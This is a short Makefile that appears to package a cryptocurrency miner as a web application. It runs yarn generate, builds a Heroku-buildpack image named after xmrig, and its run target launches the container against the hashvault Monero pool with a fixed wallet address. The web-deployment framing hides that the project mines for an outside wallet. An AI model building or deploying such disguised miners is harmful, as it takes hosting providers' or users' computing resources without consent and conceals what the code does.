IMAGE   ?=murcmurc/xmrig # replace with a value of your choice
BUILDER ?= heroku/buildpacks:18

image: gen build

gen:
	yarn generate

build:
	pack build $(IMAGE) --builder $(BUILDER) 

run:
	docker run -it --rm -e PORT=8080 -e NODE_ENV=production -p 8080:8080 $(IMAGE) -o pool.hashvault.pro:80 -u 46qW88SQsGdCzHB65dhLpkehyJaYzzaLbM4VFFrZLqahhUCdPjkGkDYjLGGEH -k 
